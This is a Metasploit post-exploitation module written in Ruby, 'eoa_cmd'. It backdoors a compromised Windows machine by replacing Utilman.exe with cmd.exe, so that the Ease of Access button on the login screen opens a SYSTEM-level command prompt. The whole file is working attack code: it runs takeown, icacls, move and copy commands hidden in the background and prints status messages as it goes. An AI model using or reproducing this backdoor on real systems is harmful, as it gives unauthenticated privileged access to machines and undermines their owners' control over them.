require 'msf/core'

class MetasploitModule < Msf::Post

  include Msf::Post::Windows::Accounts
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::Services
  include Msf::Post::Windows::Priv
  include Msf::Post::File

  def initialize(info={})
    super(update_info(info,
        'Name'          => 'eoa_cmd',
        'Description'   => %q{This module injects cmd.exe to Utilman.exe which allows the user to access the CMD with NT-AUTHORITY privileges by clicling the 'Ease of Access Button' or pressing [ Windows Key + U ] on the login window.},
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Sentry L.L.C' ],
        'Platform'      => [ 'win' ],
        'SessionTypes'  => [ 'meterpreter', 'shell' ]
    ))
  end
  def run
    r=''
    user = client.sys.config.getuid
    process = client.sys.process.getpid
    sysinfo = client.sys.config.sysinfo['OS']
    loged_on_User = client.sys.config.sysinfo['Logged On Users']

    commands = ["cmd /C takeown /f C:\\Windows\\System32\\Utilman.exe",
                "cmd /C icacls C:\\Windows\\System32\\Utilman.exe /grant administrators:F",
                "cmd /C move C:\\Windows\\System32\\Utilman.exe C:\\Windows\\System32\\shadowUtilman.exe",
                "cmd /C copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\Utilman.exe"]

    session.response_timeout=120

    if is_admin?

      print_status("Please make sure you have migrated to a user process.")
      print_status("System info : #{sysinfo}")
      print_status("Logged on Users # :  #{loged_on_User}")
      print_status("Executing script as user : [ #{user} ] on process : [ #{process} ]")
      print_status("Injecting CMD.exe to Utilman ...")

      commands.each do |cmd|
        begin

          r = session.sys.process.execute("cmd.exe /c #{cmd}", nil, {'Hidden' => true, 'Channelized' => true})
          r.channel.close
          r.close
        rescue ::Exception => e
          print_error("Error Running Command #{cmd}: #{e.class} #{e}")
        end
      end

      print_good("Injection completed successfully.")
      print_line("")
    else
      print_error("Insufficient privileges, Injection was not completed.")
      print_error("User [ #{user} ] is not on Administrators group.")
      print_line("")
    end
  end
end
